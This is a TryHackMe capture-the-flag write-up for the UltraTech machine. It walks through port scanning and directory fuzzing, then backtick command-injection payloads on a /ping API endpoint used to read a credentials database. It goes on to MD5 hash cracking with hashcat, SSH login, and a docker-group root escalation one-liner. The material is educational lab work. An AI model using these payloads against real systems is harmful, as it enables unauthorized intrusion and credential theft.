# Try Hack Me - UltraTech
# Author: Atharva Bordavekar
# Difficulty: Medium
# Points:
# Vulnerabilities:

# Phase 1 - Reconnaissance:

port scanning:

```bash
nmap -p- --min-rate=1000 <target_ip>
```
PORT      STATE SERVICE
21/tcp    open  ftp
22/tcp    open  ssh
8081/tcp  open  blackice-icecap
31331/tcp open  unknown

we find out a non-standard port 31331. lets find out what services both 8081 and 31331 ports are hosting.

```bash
nmap -sC -sV -p 8081,31331 <target_ip>
```

PORT      STATE SERVICE VERSION

8081/tcp  open  http    Node.js Express framework
|_http-title: Site doesn't have a title (text/html; charset=utf-8).
|_http-cors: HEAD GET POST PUT DELETE PATCH

31331/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: UltraTech - The best of technology (AI, FinTech, Big Data)
|_http-server-header: Apache/2.4.41 (Ubuntu)

 
the software which is using the port 8081 is Node.js and the software which is using the non-standard port 31331 is Apache. The Linux distro being used is Ubuntu.

after loads of time trying to fuzz the api endpoints at port 8081, i decided to go to port 31331 and find any hidden clues in the website. i found an interesting comment in the page-source of the website at http://<target_ip>:31331 

lets fuzz the directories of this website to find out any leads.

```bash
gobuster dir -u http://<target_ip>:31331 -w /usr/share/wordlists/dirb/common.txt
```
i found /robots.txt to be present. upon stumbling at /robots.txt, i found the location to a .txt file which contained the names of 3 directories. 

after manual enumeration the /partners.html directory is useful as it leads us to a login page. in the source-code of the login page you can see that http-get method is being used for authentication which is a very insecure practice. along with that, i also found the source code of the api at /js/api.js towards the bottom of the source code. this reveals 2 very important api endpoints which are /auth and /ping.

# Phase 2 - Initial Foothold

using the hint given in the tasks, we will ignore the /auth endpoint and enumerate the ping enpoint. the ping endpoint needs a parameter named ip. it returns a normal ping statement when given the value as 127.0.0.1 

lets try to achieve RCE (we already have achieved by carrying out ping) to get some additional information from the system. i tried various payloads from PayloadAllTheThings like chaining the ping command, bypassing filters and i got 1 hit with $(whoami).

```bash
http://<target_ip>:8081/ping?ip=127.0.0.1$(whoami)
```
it throws an error which reveals that the current shell on the system is /bin/sh. combining that information with the fact that the backend must be handled with a javascript program, i made use of backticks ` for bypassing the filter (backticks are the most common filter bypass techniques with sh shells).

```bash
http://<target_ip>:8081/ping?ip=127.0.0.1`whoami`
```
voila! we have achieved RCE via filter bypassing and command chaining. lets find out the name of the database lying around by chaining the `ls` command in the payload.

```bash
http://<target_ip>:8081/ping?ip=127.0.0.1`ls`
```
this displays the name of the database file on the system. 

# Shell as r00t:

i spent hours to get a reverse shell on the system using the recently discovered RCE. after multiple failed attempts, i read the tasks carefully and found out that the database file itself could have the stored credentials. lets find out the contents of the database file.

```bash
http://<target_ip>:8081/ping?ip=127.0.0.1`cat%20utech.db.sqlite`
```
we get the username of 2 users along with their password hashes. the 1st user appears to be on the system as the tasks are concerned only with the 1st user. the password hashes are in `MD5` format.

lets use hashcat to crack the password hash of the 1st user.

```bash
#first store the hash in a file named hash.txt
hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt
```
after some time the password will be cracked. we can use this username-password combination to remotely login to the ssh service.

```bash
ssh r00t@<target_ip>
#enter the cracked password when prompted
```
and just like that, we get a shell as r00t. lets use linpeas on the system and escalate privileges to root. i noticed that the user r00t was a member of the docker group. this caught my attention and i immediately started researching about privilege esacalation via docker. i finally understood that a user of the docker group can immediately spawn a root shell using a one-liner from GTFObins.

lets first check what images are available on the system

```bash
docker ps -a
```

as we can see there are 3 images available and all three are bash images. so we will have to modify the GTFObins oneliner a little bit according to our situation

```bash
#we replace alpine with bash
docker run -v /:/mnt --rm -it bash chroot /mnt /bin/sh
```

and just like that we have spawned a shell as root! however this shell will have a very poor tty. lets answer the last question by copy pasting the first 9 characters of the root user's private ssh key at the location /root/.ssh/id_rsa
